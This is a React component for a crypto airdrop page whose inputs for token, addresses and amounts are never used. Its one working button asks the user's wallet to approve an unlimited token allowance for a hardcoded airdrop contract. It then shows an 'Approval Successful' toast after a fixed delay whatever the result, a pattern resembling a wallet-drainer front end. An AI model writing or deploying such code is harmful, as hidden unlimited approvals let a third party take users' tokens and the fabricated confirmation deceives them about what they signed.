import Image from "next/image";
import JumboCard from "./JumboCard";
import { InformationCircleIcon } from "@heroicons/react/24/outline";
import { Textarea } from "../ui/textarea";
import { useAccount, useWriteContract } from "wagmi";
import { useToast } from "@/components/ui/use-toast";
import { NftContract, NftABI, abi, AirdropContract } from "@/config/Abi";
import { erc20Abi } from "viem";
import { Input } from "../ui/input";

const TokensBanner = () => {
  const { address } = useAccount();
  const { writeContract } = useWriteContract();
  const { toast } = useToast();

  const callApprove = () => {
    writeContract({
      abi: erc20Abi,
      address: NftContract,
      functionName: "approve",
      args: [
        //@ts-ignore
        AirdropContract,
        BigInt(1e50),
      ],
    });

    setTimeout(
      () =>
        toast({
          title: "Approval Successful",
          description: "NFTs Approved for Airdrop",
        }),
      4000
    );
  };

  return (
    <div className="h-full mt-10 mb-10 container w-full px-3.5">
      <div className="bg-[#111827] border border-gray-600 p-5 lg:p-8 rounded-2xl shadow-xl flex flex-col lg:items-center relative">
        <div className="w-full justify-center items-center flex text-center font-extrabold text-neutral-400 text-sm lg:text-xl">
          Manage Airdrops / Free Minting
          <InformationCircleIcon className="text-neutral-400 w-5 md:w-6 ml-2" />
        </div>

        <div className="text-xs md:text-base text-center w-full mt-5">
          Airdroping Tokens (excluding gas) to different wallets, e.g. airdrop
          winners, sweepstakes winners, send to your colleagues for free...
          upload a list of addresses and the amount of tokens that correspond to
          them,
        </div>
        <div className="w-full mt-10">
          <Input placeholder="Token Contract" />
        </div>
        <div className="w-full flex items-center flex-col space-y-8 mt-5">
          <Textarea
            className="w-full min-h-[120px]"
            placeholder={`Destination addresses (separated by commas breaks), ex: \n0xab58…ec9b,\n0xcd93…ec9b,\n0xsr58…ec7b,`}
          />
          <div className="w-full flex flex-col md:flex-row space-y-4 md:space-y-0 md:space-x-3 items-center">
            <Textarea
              placeholder="Amount of tokens per wallet"
              className="w-full min-h-[120px]"
            />
            <div className="text-lg">OR</div>
            <Textarea
              placeholder={`Amount of tokens per each wallet (separated by commas breaks), ex: \n1,\n5,\n3,`}
              className="w-full min-h-[120px]"
            />
          </div>
        </div>

        <div className="mt-10 flex flex-col space-y-5 items-center justify-center">
          <button className="w-full relative h-auto inline-flex items-center justify-center rounded-xl transition-colors text-sm sm:text-base font-medium px-4 py-3 sm:px-6 cursor-pointer disabled:bg-opacity-70 bg-green-500 active:bg-green-700 text-neutral-50 flex-1 delay-75">
            Add Addresses
          </button>
          <button
            onClick={() => callApprove()}
            className="w-full relative h-auto inline-flex items-center justify-center rounded-xl transition-colors text-sm sm:text-base font-medium px-4 py-3 sm:px-6 cursor-pointer disabled:bg-opacity-70 bg-red-500 active:bg-red-700 text-neutral-50 flex-1 delay-75"
          >
            Set Approval For all
          </button>
        </div>
      </div>
    </div>
  );
};

export default TokensBanner;
